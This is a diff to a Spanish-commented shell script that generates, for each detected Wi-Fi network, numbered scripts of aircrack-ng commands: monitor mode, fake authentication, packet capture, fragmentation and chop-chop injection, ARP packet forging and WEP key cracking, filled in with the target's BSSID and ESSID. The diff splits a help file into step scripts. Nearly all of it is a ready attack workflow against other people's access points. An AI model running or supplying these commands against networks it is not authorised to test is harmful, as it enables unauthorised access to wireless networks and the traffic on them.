@@ -223,7 +223,7 @@ fi
 
 IfaceStaMode
 
-MAC_ADDRESS=`ifconfig wifi0 | grep HWaddr | sed -e "s/.*HWaddr //g" -e "s/ .*//g" -e "s/-00-00-00-00-00-00-00-00-00-00//g" -e "s/-/:/g"`
+MAC_ADDRESS=`ifconfig wifi0 | grep "wifi0" | sed -e "s/ * / /g" | cut -d " " -f 5 | cut -b 1-17`
 
 CHANNEL_LIST=`iwlist ath0 channel | grep "Channel.*:" | sed -e "s/.*Channel //g" -e "s/ .*//g" -e "s/^0//g"`
 
@@ -260,39 +260,42 @@ do
 		echo "ESSID=$ESSID" >> "$DIRWIFI/variables.sh"
 		echo "CHANNEL=$CHANNEL" >> "$DIRWIFI/variables.sh"
 	
-		echo "# 1) Inicializar la interfaz en modo monitor con :" > "$DIRWIFI/ayuda.txt"
-		echo "airmon-ng start wifi0 $CHANNEL" >> "$DIRWIFI/ayuda.txt"
-		echo "# 2) Destruimos la interfaz ath0 con :" >> "$DIRWIFI/ayuda.txt"
-		echo "airmon-ng stop ath0" >> "$DIRWIFI/ayuda.txt"
-		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
+		echo "# 1) Inicializar la interfaz en modo monitor con :" > "$DIRWIFI/00-monmode.sh"
+		echo "airmon-ng start wifi0 $CHANNEL" >> "$DIRWIFI/00-monmode.sh"
+		echo "# 2) Destruimos la interfaz ath0 con :" >> "$DIRWIFI/00-monmode.sh"
+		echo "airmon-ng stop ath0" >> "$DIRWIFI/00-monmode.sh"
+		echo "# ---------------------------------------------------" >> "$DIRWIFI/00-monmode.sh"
 	
-		echo "# 3) Probamos ha hacer una falsa autenticacion con :" >> "$DIRWIFI/ayuda.txt"
-		echo "aireplay-ng -1 0 -e \"$ESSID\" -a $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
-		echo "# 3.1) Si falla deberiamos mirar si el ap filtra por ap o si estamos lo suficientemente cerca. Si aun asi no conseguimos hacer la false autenticacion debemos desistir porque el resto de pasos fallara" >> "$DIRWIFI/ayuda.txt"
-		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
-		echo "# 4) En una nueva consola lanzamos la captura de paquetes con : " >> "$DIRWIFI/ayuda.txt"
-		echo "airodump-ng -c $CHANNEL --bssid $BSSID -w capture ath1" >> "$DIRWIFI/ayuda.txt"
-		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
+		echo "# 3) Probamos ha hacer una falsa autenticacion con :" > "$DIRWIFI/01-fakeauth.sh"
+		echo "aireplay-ng -1 0 -e \"$ESSID\" -a $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/01-fakeauth.sh"
+		echo "# 3.1) Si falla deberiamos mirar si el ap filtra por ap o si estamos lo suficientemente cerca. Si aun asi no conseguimos hacer la false autenticacion debemos desistir porque el resto de pasos fallara" >> "$DIRWIFI/01-fakeauth.sh"
+		echo "# ---------------------------------------------------" >> "$DIRWIFI/01-fakeauth.sh"
 
-		echo "# 5) Aqui tenemos 2 caminos :" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.1) Si hay clientes conectados podemos intentar el ataque por fragmentacion" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.1.1) En otra nueva consola lanzamos el ataque por fragmentacion ejecutando :" >> "$DIRWIFI/ayuda.txt"
-		echo "aireplay-ng -3 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.1.1.1) En cuanto empieze a inyectar paquetes pasamos al paso 5" >> "$DIRWIFI/ayuda.txt"
-		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
+		echo "# 4) En una nueva consola lanzamos la captura de paquetes con : " > "$DIRWIFI/02-capture.sh"
+		echo "airodump-ng -c $CHANNEL --bssid $BSSID -w capture ath1" >> "$DIRWIFI/02-capture.sh"
+		echo "# ---------------------------------------------------" >> "$DIRWIFI/02-capture.sh"
+
+		echo "# 5) Aqui tenemos 2 caminos :" > "$DIRWIFI/03.1-fragmentatack.sh"
+		echo "# 5) Aqui tenemos 2 caminos :" > "$DIRWIFI/03.2-chopatack.sh"
+		echo "# 5.1) Si hay clientes conectados podemos intentar el ataque por fragmentacion" >> "$DIRWIFI/03.1-fragmentatack.sh"
+		echo "# 5.1.1) En otra nueva consola lanzamos el ataque por fragmentacion ejecutando :" >> "$DIRWIFI/03.1-fragmentatack.sh"
+		echo "aireplay-ng -3 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/03.1-fragmentatack.sh"
+		echo "# 5.1.1.1) En cuanto empieze a inyectar paquetes pasamos al paso 5" >> "$DIRWIFI/03.1-fragmentatack.sh"
+		echo "----------------------------------------------------" >> "$DIRWIFI/03.1-fragmentatack.sh"
 	
-		echo "# 5.2) Si NO hay clientes conectados podemos intentar el ataque chop-chop" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.2.1) El ataque chop-chop requiere un paquete especial, lo capturamos lanzando :" >> "$DIRWIFI/ayuda.txt"
-		echo "aireplay-ng -5 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.2.1.1) Si no recibimos paquetes o cuando los recibimos no los podemos inyectar deberemos buscar ayuda en aircrack-ng.org ;o) lo mas seguro sera que el ap este filtrando por mac o que tengamos que esperar a que haya un cliente generando paquetes de datos, ya lo se, pone que no es necesario que haya clientes conectados pero en algunos aps es probable que lo necesitemos" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.2.2) Tenemos que generar un paquete arp especial que genera muchos IVS o algo asi, lo haremos lanzando :" >> "$DIRWIFI/ayuda.txt"
-		echo "packetforge-ng -0 -a $BSSID -h $MAC_ADDRESS -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request" >> "$DIRWIFI/ayuda.txt"
-		echo "# 5.2.3) En una nueva consola lanzamos la inyeccion del paquete formado con : " >> "$DIRWIFI/ayuda.txt"
-		echo "aireplay-ng -2 -r arp-request ath1" >> "$DIRWIFI/ayuda.txt"
-		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
-		echo "# 6) En una nueva consola ejecutamos el crackeo de los paquetes capturados" >> "$DIRWIFI/ayuda.txt"
-		echo "aircrack-ng -s -b $BSSID capture*.cap" >> "$DIRWIFI/ayuda.txt"
-		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
+		echo "# 5.2) Si NO hay clientes conectados podemos intentar el ataque chop-chop" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "# 5.2.1) El ataque chop-chop requiere un paquete especial, lo capturamos lanzando :" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "aireplay-ng -5 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "# 5.2.1.1) Si no recibimos paquetes o cuando los recibimos no los podemos inyectar deberemos buscar ayuda en aircrack-ng.org ;o) lo mas seguro sera que el ap este filtrando por mac o que tengamos que esperar a que haya un cliente generando paquetes de datos, ya lo se, pone que no es necesario que haya clientes conectados pero en algunos aps es probable que lo necesitemos" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "# 5.2.2) Tenemos que generar un paquete arp especial que genera muchos IVS o algo asi, lo haremos lanzando :" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "packetforge-ng -0 -a $BSSID -h $MAC_ADDRESS -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "# 5.2.3) En una nueva consola lanzamos la inyeccion del paquete formado con : " >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "aireplay-ng -2 -r arp-request ath1" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "# ---------------------------------------------------" >> "$DIRWIFI/03.2-chopatack.sh"
+		echo "# 6) En una nueva consola ejecutamos el crackeo de los paquetes capturados" > "$DIRWIFI/04-crackeo.sh"
+		echo "aircrack-ng -s -b $BSSID capture*.cap" >> "$DIRWIFI/04-crackeo.sh"
+		echo "# ---------------------------------------------------" >> "$DIRWIFI/04-crackeo.sh"
+		cat "$DIRWIFI/"0*.sh > "$DIRWIFI/ayuda.txt"
 		echo "# NOTAS :" >> "$DIRWIFI/ayuda.txt"
 		echo "# N1) Para los casos de aps que no generan paquetes seria conveniente ejecutar en una nueva consola :" >> "$DIRWIFI/ayuda.txt"
 		echo "watch -n 60 \"aireplay-ng -1 0 -e \\\"$ESSID\\\" -a $BSSID -h $MAC_ADDRESS ath1\"" >> "$DIRWIFI/ayuda.txt"
@@ -334,7 +337,11 @@ IfaceMonMode
 
 # El for in separa por espacio o retorno de carro, por ello quitamos los espacios en blanco
 # sustituyendolos por #
-IWLIST_DATA_AUX=`echo $IWLIST_DATA_AUX | tr " " "#" | sort | uniq`
+echo -e $IWLIST_DATA_AUX | tr " " "#" > list-data.txt
+cat list-data.txt | sort > list-data-ordered.txt
+cat list-data-ordered.txt | uniq > list-data-uniq.txt
+
+IWLIST_DATA_AUX=`cat list-data-uniq.txt`
 
 for ESSID_CFG in `echo -e $IWLIST_DATA_AUX`
 do
